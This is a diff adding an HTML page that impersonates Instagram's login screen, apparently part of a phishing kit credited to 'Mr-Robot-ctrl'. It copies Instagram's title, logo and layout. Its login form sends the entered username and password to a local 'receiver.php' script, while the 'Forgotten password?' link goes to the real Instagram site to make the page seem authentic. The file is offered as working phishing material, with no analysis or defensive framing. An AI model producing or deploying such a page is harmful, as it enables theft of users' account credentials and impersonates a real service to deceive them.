@@ -1,0 +1,210 @@
+<!-- Created by Mr-Robot-ctrl -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+    body {
+      min-height: 100vh;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #fff6e5 0%, #eaf1fa 60%, #e6f7f6 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+    }
+    .container {
+      width: 100%;
+      max-width: 700px;
+      padding: 0 16px;
+      margin-top: 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .lang {
+      text-align: center;
+      width: 100%;
+      font-size: 15px;
+      color: #222;
+      margin-bottom: 30px;
+    }
+    .logo {
+      margin: 0 auto 30px auto;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .logo svg {
+      width: 60px;
+      height: 60px;
+    }
+    .form-section {
+      width: 100%;
+      border-radius: 20px;
+      padding: 24px 0 32px 0;
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+      box-sizing: border-box;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+      margin-bottom: 24px;
+    }
+    .input {
+      margin: 0 16px 16px 16px;
+      padding: 18px 16px;
+      font-size: 0.9rem;
+      border-radius: 12px;
+      border: 1px solid #d8d8d8;
+      background: #fff;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .input:focus {
+      border-color: #1877f2;
+    }
+    .login-btn {
+      margin: 0 16px 0 16px;
+      background: #1877f2;
+      color: white;
+      font-size: 1.0rem;
+      border: none;
+      border-radius: 28px;
+      padding: 14px 0;
+      cursor: pointer;
+      font-weight: 500;
+      transition: background 0.2s;
+    }
+    .login-btn:hover,
+    .login-btn:focus {
+      background: #166fe0;
+    }
+    .forgot-row {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px 0 0 0;
+    }
+    .forgot-link {
+      color: #000000;
+      text-decoration: none;
+      font-size: 1rem;
+      font-weight: 400;
+      text-align: center;
+    }
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+    .create-section {
+      width: 100%;
+      margin-top: 16px;
+      margin-bottom: 24px;
+      display: flex;
+      justify-content: center;
+    }
+    .create-btn {
+      width: 100%;
+      max-width: 100%;
+      border-radius: 28px;
+      border: 1.5px solid #1877f2;
+      background: transparent;
+      color: #1877f2;
+      font-size: 1.1rem;
+      padding: 14px 0;
+      margin: 0 8px;
+      cursor: pointer;
+      font-weight: 500;
+      transition: background 0.2s, color 0.2s;
+      text-align: center;
+    }
+    .create-btn:hover,
+    .create-btn:focus {
+      background: #eaf1fa;
+      color: #1252b8;
+    }
+    .meta-row {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 32px 0 12px 0;
+    }
+    .meta-img-slot {
+      position: relative;
+      bottom: 55px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 65px;   /* matches image natural height */
+      width: 65px;   /* matches image natural width */
+      max-width: 95vw;
+    }
+    .meta-img-slot img {
+      height: 100%;
+      width: auto;
+      display: block;
+      object-fit: contain;
+      max-width: 100%;
+      max-height: 100%;
+      /* Remove background and border if any */
+      background: transparent;
+      border: none;
+      margin: 0;
+      padding: 0;
+    }
+    @media (max-width: 600px) {
+      .container {
+        max-width: 100vw;
+        padding: 0 2vw;
+      }
+      .form-section, .create-btn {
+        font-size: 1.0rem;
+      }
+      .form-section {
+        padding: 18px 0 20px 0;
+      }
+      .input {
+        font-size: 1rem;
+        padding: 16px 12px;
+      }
+      .login-btn, .create-btn {
+        font-size: 1rem;
+        padding: 12px 0;
+      }
+      .meta-img-slot {
+        height: 18px;
+        width: 84px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="lang">English (UK)</div>
+    <div class="logo">
+      <img src="img2.png" alt="Instagram">
+    </div>
+    <form class="form-section" autocomplete="off" id="login-form" method="POST" action="receiver.php">
+      <input class="input" type="text" placeholder="Username, email address or mobile number" name="username" autocomplete="username" />
+      <input class="input" type="password" placeholder="Password" name="password" autocomplete="current-password" />
+      <button class="login-btn" type="submit">Log in</button>
+      <div class="forgot-row">
+        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgotten password?</a>
+      </div>
+    </form>
+    <div class="create-section">
+      <button class="create-btn">Create new account</button>
+    </div>
+  <!-- Removed meta-footer logo at the bottom -->
+  </div>
+</body>
+</html>
